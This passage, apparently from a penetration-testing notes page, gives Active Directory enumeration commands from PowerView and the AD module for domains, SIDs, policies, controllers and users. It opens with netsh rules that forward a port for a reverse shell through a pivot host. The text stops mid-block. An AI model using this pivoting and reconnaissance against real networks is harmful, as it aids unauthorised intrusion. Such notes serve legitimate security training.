<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 810px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 206px; min-width: 810.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Forward the port 4545 for the reverse shell, and the 80 for the http server for example</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">interface</span> <span class="cm-identifier">portproxy</span> <span class="cm-identifier">add</span> <span class="cm-identifier">v4tov4</span> <span class="cm-identifier">listenport</span><span class="cm-operator">=</span><span class="cm-number">4545</span> <span class="cm-identifier">connectaddress</span><span class="cm-operator">=</span><span class="cm-number">192.168.50.44</span> <span class="cm-identifier">connectport</span><span class="cm-operator">=</span><span class="cm-number">4545</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">interface</span> <span class="cm-identifier">portproxy</span> <span class="cm-identifier">add</span> <span class="cm-identifier">v4tov4</span> <span class="cm-identifier">listenport</span><span class="cm-operator">=</span><span class="cm-number">80</span> <span class="cm-identifier">connectaddress</span><span class="cm-operator">=</span><span class="cm-number">192.168.50.44</span> <span class="cm-identifier">connectport</span><span class="cm-operator">=</span><span class="cm-number">80</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Correctly open the port on the machine</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">advfirewall</span> <span class="cm-identifier">firewall</span> <span class="cm-identifier">add</span> <span class="cm-identifier">rule</span> <span class="cm-identifier">name</span><span class="cm-operator">=</span><span class="cm-string">"PortForwarding 80"</span> <span class="cm-builtin">dir</span><span class="cm-operator">=</span><span class="cm-keyword">in</span> <span class="cm-identifier">action</span><span class="cm-operator">=</span><span class="cm-identifier">allow</span> <span class="cm-identifier">protocol</span><span class="cm-operator">=</span><span class="cm-identifier">TCP</span> <span class="cm-identifier">localport</span><span class="cm-operator">=</span><span class="cm-number">80</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">advfirewall</span> <span class="cm-identifier">firewall</span> <span class="cm-identifier">add</span> <span class="cm-identifier">rule</span> <span class="cm-identifier">name</span><span class="cm-operator">=</span><span class="cm-string">"PortForwarding 80"</span> <span class="cm-builtin">dir</span><span class="cm-operator">=</span><span class="cm-identifier">out</span> <span class="cm-identifier">action</span><span class="cm-operator">=</span><span class="cm-identifier">allow</span> <span class="cm-identifier">protocol</span><span class="cm-operator">=</span><span class="cm-identifier">TCP</span> <span class="cm-identifier">localport</span><span class="cm-operator">=</span><span class="cm-number">80</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">advfirewall</span> <span class="cm-identifier">firewall</span> <span class="cm-identifier">add</span> <span class="cm-identifier">rule</span> <span class="cm-identifier">name</span><span class="cm-operator">=</span><span class="cm-string">"PortForwarding 4545"</span> <span class="cm-builtin">dir</span><span class="cm-operator">=</span><span class="cm-keyword">in</span> <span class="cm-identifier">action</span><span class="cm-operator">=</span><span class="cm-identifier">allow</span> <span class="cm-identifier">protocol</span><span class="cm-operator">=</span><span class="cm-identifier">TCP</span> <span class="cm-identifier">localport</span><span class="cm-operator">=</span><span class="cm-number">4545</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">netsh</span> <span class="cm-identifier">advfirewall</span> <span class="cm-identifier">firewall</span> <span class="cm-identifier">add</span> <span class="cm-identifier">rule</span> <span class="cm-identifier">name</span><span class="cm-operator">=</span><span class="cm-string">"PortForwarding 4545"</span> <span class="cm-builtin">dir</span><span class="cm-operator">=</span><span class="cm-identifier">out</span> <span class="cm-identifier">action</span><span class="cm-operator">=</span><span class="cm-identifier">allow</span> <span class="cm-identifier">protocol</span><span class="cm-operator">=</span><span class="cm-identifier">TCP</span> <span class="cm-identifier">localport</span><span class="cm-operator">=</span><span class="cm-number">4545</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 206px;"></div><div class="CodeMirror-gutters" style="height: 256px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-domain-enumeration">Domain Enumeration</h2>
<h3 id="bkmrk-domain-objects">Domain Objects</h3>
<h4 id="bkmrk-current-domain">Current domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 250px; min-width: 253.095px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetDomain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADDomain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Domain SID</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainSID</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">Get-ADDomain</span><span class="cm-punctuation">).</span><span class="cm-identifier">DomainSID</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Domain policy</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">Get-DomainPolicy</span><span class="cm-punctuation">).</span><span class="cm-string">"system access"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 250px;"></div><div class="CodeMirror-gutters" style="height: 290px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-another-domain">Another Domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 260.333px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetDomain</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADDomain</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 160px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-domain-controller">Domain controller</h3>
<h4 id="bkmrk-current-domain-0">Current domain</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 420px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 419.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetDomainController</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADDomainController</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetDomainController</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADDomainController</span> <span class="cm-operator">-</span><span class="cm-identifier">DomainName</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Discover</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 213px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-users-enumeration">Users enumeration</h3>
<h4 id="bkmrk-list-users">List users</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetUser</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 203px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-user%27s-properties">User's properties</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 760px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 759.762px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-operator">*</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-operator">-</span><span class="cm-identifier">First</span> <span class="cm-number">1</span> <span class="cm-operator">|</span> <span class="cm-builtin">Get-Member</span> <span class="cm-operator">-</span><span class="cm-identifier">MemberType</span> <span class="cm-operator">*</span><span class="cm-identifier">Property</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span 